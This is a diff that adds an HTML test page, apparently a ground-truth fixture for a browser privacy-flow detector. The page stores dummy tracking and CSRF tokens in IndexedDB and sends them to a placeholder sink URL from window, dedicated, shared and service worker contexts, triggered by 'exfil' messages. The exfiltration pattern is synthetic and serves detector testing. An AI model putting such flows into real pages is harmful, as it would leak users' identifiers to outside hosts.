@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>PrivaDB worker IDB test</title></head>
+<body>
+<h1>idb workers test</h1>
+<script>
+// Ground-truth page: IDB → network flows from FOUR contexts.
+//   window     — /v/wwin            (scored; transforms.html already
+//                                    covers window for the classic 12)
+//   dedicated  — /v/w*  (11 transforms + xhr + beacon + 2 benign)
+//   shared     — /v/shraw, /v/shb64
+//   service    — /v/svraw, /v/svb64  (environment-dark on FF: asserted
+//                                    via sink only, NOT in WORKER_FLOWS)
+// Values + paths must match ground_truth.py WORKER_FLOWS.
+// IDB writes happen HERE (window); every context reads the same records.
+const SINK = "__SINK_BASE__";
+const TID = "tid-0f3e2d1c4b5a69788796a5b4c3d2e1f0";
+const CSRF = "csrf-11223344556677889900aabbccddeeff";
+const VERSION = "v1.2.3-build.987654321";
+
+function writeIDB(pairs) {
+  return new Promise((resolve) => {
+    const req = indexedDB.open("wk_db", 1);
+    req.onupgradeneeded = (e) => {
+      const db = e.target.result;
+      if (!db.objectStoreNames.contains("ids")) db.createObjectStore("ids");
+    };
+    req.onsuccess = (e) => {
+      const db = e.target.result;
+      const tx = db.transaction("ids", "readwrite");
+      const st = tx.objectStore("ids");
+      for (const [k, v] of pairs) st.put(v, k);
+      tx.oncomplete = () => resolve(db);
+      tx.onerror = () => resolve(null);
+    };
+    req.onerror = () => resolve(null);
+  });
+}
+
+async function main() {
+  await writeIDB([["tid", TID], ["csrf", CSRF], ["version", VERSION]]);
+
+  // ── window-context flow (scored; gives this page its own window
+  //    idb_hook baseline so before/after is comparable per page) ──
+  try { fetch(`${SINK}/v/wwin?x=${TID}`); } catch (e) {}
+
+  const done = { dedicated: false, shared: false, service: false };
+
+  // ── dedicated worker (route-injected when hooks are on) ──
+  try {
+    const w = new Worker("/wk.js");
+    w.onmessage = (e) => {
+      if (String(e.data) === "wk-done") done.dedicated = true;
+    };
+    w.onerror = () => { done.dedicated = true; };
+  } catch (e) { done.dedicated = true; }
+
+  // ── shared worker (blob-bootstrap when hooks are on) ──
+  try {
+    const sw = new SharedWorker("/wk-shared.js");
+    sw.port.onmessage = (e) => {
+      if (String(e.data) === "sh-done") done.shared = true;
+    };
+    sw.port.start();
+    setTimeout(() => {
+      try { sw.port.postMessage({ cmd: "exfil" }); } catch (e) {}
+    }, 300);
+  } catch (e) { done.shared = true; }
+
+  // ── service worker (environment-dark on Playwright+Firefox; its
+  //    flows are proven browser-side by the sink, not by detectors) ──
+  try {
+    const reg = await navigator.serviceWorker.register("/wk-sw.js");
+    for (let i = 0; i < 50 && !(reg && reg.active); i++) {
+      await new Promise((r) => setTimeout(r, 100));
+    }
+    if (reg && reg.active) {
+      const mc = new MessageChannel();
+      const replied = new Promise((resolve) => {
+        const t = setTimeout(() => resolve("timeout"), 3000);
+        mc.port1.onmessage = (e) => { clearTimeout(t); resolve(String(e.data)); };
+      });
+      reg.active.postMessage({ cmd: "exfil" }, [mc.port2]);
+      await replied;
+      done.service = true;
+    }
+  } catch (e) { /* counted via sink instead */ }
+
+  // ── wait for worker completions (bounded) ──
+  const t0 = Date.now();
+  while ((!done.dedicated || !done.shared) && Date.now() - t0 < 6000) {
+    await new Promise((r) => setTimeout(r, 100));
+  }
+  document.title = "wk-done";
+}
+main();
+</script>
+</body>
+</html>
